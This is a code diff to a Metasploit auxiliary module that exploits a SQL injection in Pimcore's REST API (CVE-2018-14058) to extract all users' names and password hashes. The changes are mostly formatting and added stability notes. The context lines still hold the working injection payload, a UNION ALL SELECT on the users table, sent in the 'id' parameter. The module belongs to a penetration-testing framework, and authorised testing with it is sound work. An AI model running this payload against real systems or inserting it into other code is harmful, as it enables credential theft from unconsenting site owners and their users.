@@ -7,48 +7,54 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Pimcore Gather Credentials via SQL Injection',
-      'Description'    => %q{
-        This module extracts the usernames and hashed passwords of all users of
-        the Pimcore web service by exploiting a SQL injection vulnerability in
-        Pimcore's REST API.
+    super(
+      update_info(
+        info,
+        'Name' => 'Pimcore Gather Credentials via SQL Injection',
+        'Description' => %q{
+          This module extracts the usernames and hashed passwords of all users of
+          the Pimcore web service by exploiting a SQL injection vulnerability in
+          Pimcore's REST API.
 
-        Pimcore begins to create password hashes by concatenating a user's
-        username, the name of the application, and the user's password in the
-        format USERNAME:pimcore:PASSWORD.
+          Pimcore begins to create password hashes by concatenating a user's
+          username, the name of the application, and the user's password in the
+          format USERNAME:pimcore:PASSWORD.
 
-        The resulting string is then used to generate an MD5 hash, and then that
-        MD5 hash is used to create the final hash, which is generated using
-        PHP's built-in password_hash function.
-      },
-      'Author'         => [ 'Thongchai Silpavarangkura', # PoC
-                            'N. Rai-Ngoen',              # PoC
-                            'Shelby Pace'                # Metasploit Module
-                          ],
-      'License'        => MSF_LICENSE,
-      'References'     => [
-                            [ 'CVE', '2018-14058' ],
-                            [ 'EDB', '45208' ]
-                          ],
-      'Notes'          =>
-        {
-          'SideEffects' => [ IOC_IN_LOGS ]
+          The resulting string is then used to generate an MD5 hash, and then that
+          MD5 hash is used to create the final hash, which is generated using
+          PHP's built-in password_hash function.
         },
-      'DisclosureDate' => '2018-08-13'
-    ))
+        'Author' => [
+          'Thongchai Silpavarangkura', # PoC
+          'N. Rai-Ngoen',              # PoC
+          'Shelby Pace'                # Metasploit Module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2018-14058' ],
+          [ 'EDB', '45208' ]
+        ],
+        'Notes' => {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Stability' => UNKNOWN_STABILITY,
+          'Reliability' => UNKNOWN_RELIABILITY
+        },
+        'DisclosureDate' => '2018-08-13'
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The base path to pimcore', '/' ]),
         OptString.new('APIKEY', [ true, 'The valid API key for Pimcore REST API', '' ])
-      ])
+      ]
+    )
   end
 
   def available?
     res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  normalize_uri(target_uri.path)
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path)
     )
 
     res && res.code == 200 && res.body.include?('pimcore')
@@ -59,11 +65,11 @@ class MetasploitModule < Msf::Auxiliary
     cmd = "#{rand(256)}) UNION ALL SELECT CONCAT(name,\" \",password) from users#"
 
     res = send_request_cgi(
-      'method'  =>  'GET',
-      'uri'     =>  api_uri,
-      'vars_get'  =>  {
-        'apikey'  => datastore['APIKEY'],
-        'id'      => cmd
+      'method' => 'GET',
+      'uri' => api_uri,
+      'vars_get' => {
+        'apikey' => datastore['APIKEY'],
+        'id' => cmd
       }
     )
 
